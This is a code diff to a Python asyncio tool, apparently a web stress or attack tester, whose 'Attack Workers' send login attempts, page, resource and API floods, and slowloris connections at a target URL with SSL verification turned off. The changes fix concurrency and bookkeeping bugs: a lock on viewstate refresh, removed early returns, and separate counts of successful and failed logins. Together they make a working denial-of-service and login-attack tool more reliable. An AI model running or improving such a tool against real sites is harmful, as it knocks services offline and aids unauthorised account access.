@@ -50,7 +50,7 @@ import re
 import os
 import platform
 import socket
-import math
+import signal
 from dataclasses import dataclass, field
 from typing import List, Optional, Dict, Set, Tuple, Any
 from collections import deque
@@ -464,6 +464,7 @@ class VFTester:
         self._viewstate_cache: Dict[str, str] = {}
         self._viewstate_ts: float = 0
         self._viewstate_ttl: float = 30.0
+        self._viewstate_lock = asyncio.Lock()
         self.username_field = p.get("login_fields", {}).get("username", "username")
         self.password_field = p.get("login_fields", {}).get("password", "password")
 
@@ -533,16 +534,17 @@ class VFTester:
         return headers
 
     async def _refresh_viewstate(self, session):
-        now = time.time()
-        if now - self._viewstate_ts > self._viewstate_ttl or not self._viewstate_cache:
-            try:
-                async with session.get(self.url, headers=self._base_headers(),
-                                       ssl=False, allow_redirects=True) as resp:
-                    html = await resp.text()
-                    self._viewstate_cache = extract_form_fields(html)
-                    self._viewstate_ts = now
-            except Exception:
-                pass
+        async with self._viewstate_lock:
+            now = time.time()
+            if now - self._viewstate_ts > self._viewstate_ttl or not self._viewstate_cache:
+                try:
+                    async with session.get(self.url, headers=self._base_headers(),
+                                           ssl=False, allow_redirects=True) as resp:
+                        html = await resp.text()
+                        self._viewstate_cache = extract_form_fields(html)
+                        self._viewstate_ts = now
+                except Exception:
+                    pass
         return dict(self._viewstate_cache)
 
     # ─── Attack Workers ──────────────────────────────────────────────────────
@@ -567,18 +569,15 @@ class VFTester:
                                       mode="login", hint=f"Login {resp.status}", url=self.url)
                     await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
                     self.health_monitor.record(result)
-                    return result
             except asyncio.TimeoutError:
                 result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
                 await self.live_log.add("login", None, result.rt, "Timeout", self.url)
                 self.health_monitor.record(result)
-                return result
             except Exception as e:
                 msg = type(e).__name__
                 result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
                 await self.live_log.add("login", None, result.rt, msg, self.url)
                 self.health_monitor.record(result)
-                return result
 
             self._record(result)
             if not result.ok:
@@ -675,6 +674,7 @@ class VFTester:
             except Exception as e:
                 result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)
                 await self.live_log.add("slowloris", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
             self._record(result)
 
     async def _worker_api(self, session, endpoints, delay=0):
@@ -818,7 +818,11 @@ class VFTester:
         if r.ok: self.stats.ok += 1
         else: self.stats.fail += 1
         if r.code: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
-        if r.mode == "login": self.stats.login_fail += 1
+        if r.mode == "login":
+            if r.ok:
+                self.stats.login_ok += 1
+            else:
+                self.stats.login_fail += 1
         elif r.mode == "page": self.stats.page_hits += 1
         elif r.mode == "resource": self.stats.resource_hits += 1
         elif r.mode == "slowloris": self.stats.slowloris_hits += 1
